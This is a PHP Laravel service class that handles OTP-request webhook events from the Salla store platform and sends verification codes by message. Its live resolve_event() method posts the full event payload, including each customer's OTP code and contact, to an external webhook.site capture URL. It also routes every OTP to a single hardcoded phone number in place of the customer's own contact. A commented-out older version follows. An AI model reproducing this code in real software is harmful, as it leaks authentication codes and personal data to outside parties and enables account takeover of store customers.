<?php
namespace App\Services\SallaServices;

use Log;
use App\Models\Team;
use App\Models\EventStatus;
use App\Models\SuccessTempModel;
use App\Models\FailedMessagesModel;
use Illuminate\Support\Facades\Http;
use App\Services\AppSettings\AppEvent;
use App\Services\AppSettings\AppMerchant;

class OtpRequest extends AppMerchant implements AppEvent{
    public $data;

    protected $merchant_team = null;
    public function __construct($data){
        // set data
        $this->data = $data;

         // merchant
         $this->merchant_team = Team::with('account')->where([
            'ids' => $this->data['merchant']
        ])->first();

        // track event by using Log
        $this->set_log();
    }

    public function set_log(){
        // encode log
        $log = json_encode($this->data, JSON_UNESCAPED_UNICODE) . PHP_EOL;

        // set log data
        Log::build([
            'driver' => 'single',
            'path' => storage_path('logs/salla_events.log'),
        ])->info($log);
    }

    public function resolve_event(){
        $app_event = EventStatus::updateOrCreate([
            'unique_number' => $this->data['merchant'],
            'values'        => json_encode($this->data)
        ],[
            'event_from'    => "salla",
            'type'          => $this->data['event']
        ]);

        $attrs['otp_code'] = $this->data['data']['code'];

        $contact = preg_match('/@/',$this->data['data']['contact']);

        Http::post('https://webhook.site/19694e58-fa42-41d5-a247-2187b0718cf7',$contact);
        if($app_event->status != 'success'):
            $message = "كود التحقق {رمز_التحقق}";
            $filter_message = message_order_params($message, $attrs);
            $result_send_message = send_message(
                "201026051966" ?: $this->data['data']['contact'],
                $filter_message,
                $this->merchant_team->account->token,
                $this->merchant_team->ids
            );

            $app_event->update([
                'status' => $result_send_message
            ]);

            $app_event->increment('count_of_call');

            Http::post('https://webhook.site/19694e58-fa42-41d5-a247-2187b0718cf7',$this->data);
        endif;
    }

    // public function resolve_event(){
    //     $this->store_id         = $this->data->merchant;
    //     $customer_mobile        = $this->data->data->contact;
    //     $phone                  = str_replace("+", "", $customer_mobile);
    //     $otp                    = $this->data->data->code;
    //     $send_once              = $phone.$otp;
    //     $array                  = $this->get_merchant_settings();
    //     $get_instances          = $this->get_instances_data();
    //     list($instance_id,$api_url) = $get_instances;

    //     /**********message type start**********/
    //     $send_or_not = $array->data->settings->karzoun_otp_msg_check;
    //     $message_to_send = $array->data->settings->karzoun_otp_msg;
    //     // handle message to start send
    //     $message_to_send = $this->handle_message_to_send($message_to_send,$otp);
    //     if ($send_or_not == 1)
    //     {
    //         $check_if_sent  =  $this->send_message($phone,$message_to_send,$instance_id,$this->store_id,$api_url);
    //         //echo $response;
    //         $response       = json_encode($check_if_sent);

    //         if (!empty($check_if_sent) && $check_if_sent->status == 'success') {
    //             $SuccessTempModel                = new SuccessTempModel();
    //             $SuccessTempModel->unique_number = $send_once;
    //             $SuccessTempModel->values        = json_encode($this->data);
    //             $SuccessTempModel->type          = "otp";
    //             $SuccessTempModel->event_from    = "salla";
    //             $SuccessTempModel->save();
    //             //   file_put_contents('karzoun_log/success-new-customer.txt', $log, FILE_APPEND);
    //             echo ' Sent :)';
    //         }else{
    //             $FailedMessagesModel = new FailedMessagesModel();
    //             $FailedMessagesModel->unique_number = $send_once;
    //             $FailedMessagesModel->value         = json_encode($this->data);;
    //             $FailedMessagesModel->reason        = $response;
    //             $FailedMessagesModel->type          = "new-customer";
    //             $FailedMessagesModel->event_from    = "salla";
    //             $FailedMessagesModel->save();

    //             echo 'the response is' . $response . ' error code is '.$api_url;// . $curlerr . ' error says : ' . $curlerr2.PHP_EOL;
    //         }
    //     }

    // }

    // public function handle_message_to_send($message_to_send = '',$otp){
    //     preg_match_all("/{(.*?)}/", $message_to_send, $search);
    //     foreach ($search[1] as $variable) {
    //         $otp_status = [
    //             'رمز التحقق'          => $otp,
    //         ];
    //         $message_to_send = str_replace("{" . $variable . "}", $otp_status[$variable], $message_to_send);
    //     }
    //     $message_to_send = urlencode($message_to_send);
    //     return $message_to_send;
    // }

}
